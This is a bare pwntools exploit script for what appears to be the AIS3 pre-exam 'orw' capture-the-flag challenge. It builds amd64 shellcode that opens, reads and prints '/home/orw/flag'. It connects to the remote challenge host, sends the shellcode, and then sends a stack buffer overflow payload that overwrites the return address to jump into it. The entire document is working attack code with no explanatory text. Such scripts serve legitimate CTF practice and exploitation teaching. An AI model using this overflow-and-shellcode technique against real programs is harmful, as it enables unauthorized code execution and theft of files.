from pwn import *

context(arch='amd64')

sh = asm(
	'''
	movabs rax,0x67616c662f771111
	shr    rax,0x10
	push   rax
	movabs rax,0x726f2f656d6f682f
	push   rax
	xor    rax,rax
	inc    rax
	inc    rax
	mov    rdi,rsp
	xor    rsi,rsi
	xor    rdx,rdx
	syscall
	mov    rdi,rax
	xor    rax,rax
	mov    rsi,rsp
	xor    rdx,rdx
	inc    rdx
  	shl    rdx,0x6
  	syscall 
  	xor    rax,rax
  	inc    rax
  	xor    rdi,rdi
  	inc    rdi
  	syscall
	'''
	)

#print disasm(sh)
shell_address = 0x6010a0
payload = 'A' * 0x28 + p64(shell_address)

r = remote('pre-exam-pwn.ais3.org', 10001)
#r = process('./orw')
#gdb.attach(r)

r.recvuntil('code>')
r.send(sh)

r.recvuntil(':)')
r.sendline(payload)

r.interactive()